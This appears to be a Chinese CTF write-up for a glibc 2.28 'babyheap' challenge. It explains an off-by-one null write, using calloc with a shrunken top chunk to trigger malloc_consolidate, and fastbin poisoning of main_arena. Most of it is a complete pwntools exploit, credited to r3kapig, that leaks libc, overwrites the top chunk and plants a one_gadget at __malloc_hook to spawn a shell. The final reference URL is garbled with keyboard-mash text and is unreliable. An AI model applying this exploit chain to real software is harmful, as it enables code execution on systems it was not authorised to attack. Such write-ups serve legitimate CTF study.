# babyheap

libc是2.28的，add函数最大的size只允许0x58

```c
 if ( size > 0 && size <= 0x58 )
      {
        v3 = (char *)calloc(size, 1uLL);
        if ( !v3 )
          exit(-1);
        a1[i].alloc = 1;
        a1[i].size = size;
        a1[i].ptr = v3;
        printf("Chunk %d Allocated\n", (unsigned int)i);
      }
```

read_n函数存在`off_by_one`

```c
unsigned __int64 __fastcall readn_vuln(char *a1, unsigned __int64 len)
{
  unsigned __int64 current; // [rsp+10h] [rbp-10h]
  ssize_t v4; // [rsp+18h] [rbp-8h]

  if ( !len )
    return 0LL;
  current = 0LL;
  while ( current < len )
  {
    v4 = read(0, &a1[current], len - current);
    if ( v4 > 0 )
    {
      current += v4;
    }
    else if ( *__errno_location() != 11 && *__errno_location() != 4 )
    {
      break;
    }
  }
  a1[current] = 0;
  return current;
}
```

且add函数用的是`calloc`，这很像`HCTF2018`的`heapstorm zero`,所以我们要找到一个能触发`malloc_consolidate`的地方

而程序一开始初始化的时候：

```c
if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr )
    exit(-1);
  malloc(0x1F000uLL);
  return &addr[v3];
```

所以程序的`top_chunk`所剩的size不大，因此可以拿来触发`malloc_consolidate`
（`LD_PRELOAD libc_2.28`后execve会挂掉

exp是抄的r3kapig的大佬的：

```python
from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[2], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(c):
	p.recvuntil("Command: ")
	p.sendline(str(c))

def alloc(size):
	cmd(1)
	p.recvuntil("Size: ")
	p.sendline(str(size))

def edit(idx,size,content):
	cmd(2)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content:")
	p.send(content)
	
def dele(idx):
	cmd(3)
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def view(idx):
	cmd(4)
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def main(host,port=0):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babyheap",env={"LD_PRELOAD":"./libc-2.28.so"})  
		# p = process("./babyheap")
		gdb.attach(p)
	# fill tcache and shrink top_chunk size
	for i in range(7):
		alloc(0x28)
		edit(i,0x28,'A'*0x28) 
	for i in range(7):
		dele(i)
	for i in range(7):
		alloc(0x48)
		edit(i, 0x48,'A'*0x48)
	for i in range(7):
		dele(i)
	for i in range(15):
		alloc(0x28)
		edit(i, 0x28,'3' * 0x28)

	for i in range(15):
		dele(i)

	for i in range(7):
		alloc(0x18)
		edit(i,0x17,'4' * 0x17)
	# trigger malloc_consolidation
	alloc(0x38)		#idx7
	# unsortedbin
	# all: 0x7f1da9ad1ca0 (main_arena+96) (0x290)
	edit(7, 0x38,'7' * 0x38)
	alloc(0x18)
	alloc(0x18)
	for i in range(10, 15):
		alloc(0x48)
	dele(9)
	for i in xrange(1, 7):
		dele(i)
	dele(0)
	dele(8)
	# trigger consolidation
	alloc(0x38)
	view(10)
	p.recvuntil(': ')
	# libc.address = u64(p.recv(8)) - 0x3ebca0 #libc2.27
	libc.address = u64(p.recv(8)) - 0x1e4ca0 #libc2.28
	info("libc : " + hex(libc.address))
	for i in range(1, 4):
		alloc(0x48)
	alloc(0x58)
	# create a fastbin
	alloc(0x28)
	dele(5)
	
	# leave size in main_arena
	alloc(0x58)
	edit(5,0x48,'\x00' * 0x38 + p64(0x31) + p64(0x51))
	alloc(0x28) #idx6
	# correct unsortedbin size
	edit(6, 0x20,'\x00' * 0x18 + p64(0x21))
	# main_arena = libc.address+0x3ebc40 #libc2.27
	main_arena = libc.address+0x1e4c40 #libc2.28
	dele(1)
	edit(10, 0x8,p64(main_arena+0x10))
	# fastbins
	# 0x20: 0x0
	# 0x30: 0x51
	# 0x40: 0x0
	# 0x50: 0x558bfffa2660 -> 0x7fcf8d46ac50 (main_arena+16) <- 0x0
	alloc(0x48)
	alloc(0x48)	#idx8
	# overwrite top_chunk 
	edit(8, 0x48,'\x00' * 0x40 + p64(libc.symbols['__malloc_hook'] - 0x28))
	alloc(0x58)
	# one_gadget = libc.address+0x4f322	#libc2.27
	one_gadget = 0x501e3+libc.address	#libc2.28
	# edit(9,0x20, '\x00' * 0x10 + p64(one_gadget) + p64(libc.symbols['svc_run']+0x42))	# libc2.27
	edit(9,0x20, '\x00' * 0x10 + p64(one_gadget) + p64(libc.symbols['svc_run']+0x38))	#libc2.28
    alloc(0x20)
	p.interactive()

if __name__ == "__main__":
	# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	libc = ELF("./libc-2.28.so",checksec=False)
	main(args['REMOTE'])
```

参考链接：

[https://gist.github.com/unamer/81b55e513d03f8c092d38f839bc0137adsfkljdklsjfklsdjjroahjgkuangehiojklsdfjkldfs3409859034ikdlkjkldxcvklsdfjweroiueiosdfkljfdkxishsndsddffddfgfgdgvbnbvvbhjikukjghjhjgghjkljkljklsdfgsddffgfgf ]( https://gist.github.com/unamer/81b55e513d03f8c092d38f839bc0137adsfkljdklsjfklsdjjroahjgkuangehiojklsdfjkldfs3409859034ikdlkjkldxcvklsdfjweroiueiosdfkljfdkxishsndsddffddfgfgdgvbnbvvbhjikukjghjhjgghjkljkljklsdfgsddffgfgf )